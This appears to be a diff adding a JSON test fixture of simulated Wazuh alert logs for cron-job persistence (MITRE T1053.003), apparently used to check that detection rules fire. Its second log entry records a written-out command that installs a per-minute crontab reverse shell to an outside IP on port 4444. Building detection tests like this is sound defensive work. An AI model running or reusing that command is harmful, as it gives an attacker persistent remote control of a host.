@@ -1,0 +1,152 @@
+{
+  "_metadata": {
+    "attack_id": "T1053.003",
+    "variation": "001",
+    "name": "Cron Job Persistence",
+    "description": "Attacker creates cron job to maintain persistence",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "persistence",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Crontab modification",
+      "sequence": 1,
+      "timestamp": "2026-01-29T14:15:00.000Z",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Cron Job Persistence",
+          "id": "100200",
+          "mitre": {
+            "id": [
+              "T1053.003"
+            ],
+            "tactic": [
+              "Persistence"
+            ]
+          },
+          "firedtimes": 1,
+          "groups": [
+            "syslog",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "DVLNX01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.898136139",
+        "decoder": {
+          "name": "syslog"
+        },
+        "location": "/var/log/syslog",
+        "data": {
+          "facility": "cron",
+          "severity": "info",
+          "hostname": "DVLNX01",
+          "program": "crontab",
+          "message": "(www-data) REPLACE (www-data)"
+        },
+        "full_log": "(www-data) REPLACE (www-data)"
+      }
+    },
+    {
+      "_comment": "Audit log of crontab edit",
+      "sequence": 2,
+      "timestamp": "2026-01-29T14:15:00.500Z",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Cron Job Persistence",
+          "id": "100200",
+          "mitre": {
+            "id": [
+              "T1053.003"
+            ],
+            "tactic": [
+              "Persistence"
+            ]
+          },
+          "firedtimes": 1,
+          "groups": [
+            "syslog",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "DVLNX01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.269717460",
+        "decoder": {
+          "name": "syslog"
+        },
+        "location": "/var/log/syslog",
+        "data": {
+          "facility": "authpriv",
+          "severity": "info",
+          "hostname": "DVLNX01",
+          "program": "auditd",
+          "message": "type=EXECVE msg=audit(1706537700.500:1030): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"echo '* * * * * /bin/bash -c \\\"bash -i >& /dev/tcp/185.220.101.45/4444 0>&1\\\"' | crontab -\""
+        },
+        "full_log": "type=EXECVE msg=audit(1706537700.500:1030): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"echo '* * * * * /bin/bash -c \\\"bash -i >& /dev/tcp/185.220.101.45/4444 0>&1\\\"' | crontab -\""
+      }
+    },
+    {
+      "_comment": "File modification on crontab spool",
+      "sequence": 3,
+      "timestamp": "2026-01-29T14:15:01.000Z",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Cron Job Persistence",
+          "id": "100200",
+          "mitre": {
+            "id": [
+              "T1053.003"
+            ],
+            "tactic": [
+              "Persistence"
+            ]
+          },
+          "firedtimes": 1,
+          "groups": [
+            "syslog",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "DVLNX01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.947611362",
+        "decoder": {
+          "name": "syslog"
+        },
+        "location": "/var/log/syslog",
+        "data": {
+          "facility": "authpriv",
+          "severity": "info",
+          "hostname": "DVLNX01",
+          "program": "auditd",
+          "message": "type=PATH msg=audit(1706537701.000:1031): item=0 name=\"/var/spool/cron/crontabs/www-data\" inode=393220 dev=08:01 mode=0100600 ouid=33 ogid=33 rdev=00:00 nametype=CREATE"
+        },
+        "full_log": "type=PATH msg=audit(1706537701.000:1031): item=0 name=\"/var/spool/cron/crontabs/www-data\" inode=393220 dev=08:01 mode=0100600 ouid=33 ogid=33 rdev=00:00 nametype=CREATE"
+      }
+    }
+  ]
+}
